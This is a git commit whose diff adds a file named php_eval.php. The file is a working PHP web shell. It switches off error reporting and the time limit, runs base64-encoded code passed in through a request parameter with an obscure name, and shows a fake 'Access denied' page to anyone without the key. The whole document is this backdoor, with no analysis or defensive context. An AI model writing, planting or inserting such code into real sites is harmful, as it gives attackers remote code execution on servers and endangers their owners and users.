63ea5cec9d1cd43b56997b25850e7cd4f4e4079b
Faraz Fallahi <fffaraz@gmail.com>
2014-02-19 12:19:14 +0330

    php_eval

---
+++ php_eval.php
@@ -0,0 +1,5 @@
+<?php
+set_time_limit(0);error_reporting(NULL);
+if(($_REQUEST['8ba7afbaaddc67de33a3f'])!=NULL){eval(base64_decode($_REQUEST['8ba7afbaaddc67de33a3f']));}
+else{echo '<!DOCTYPE HTML PUBLIC\"-//IETF//DTDHTML 2.0//EN\"><html><head><title></title></head><body>Access denied.</body ></html >';}
+?>
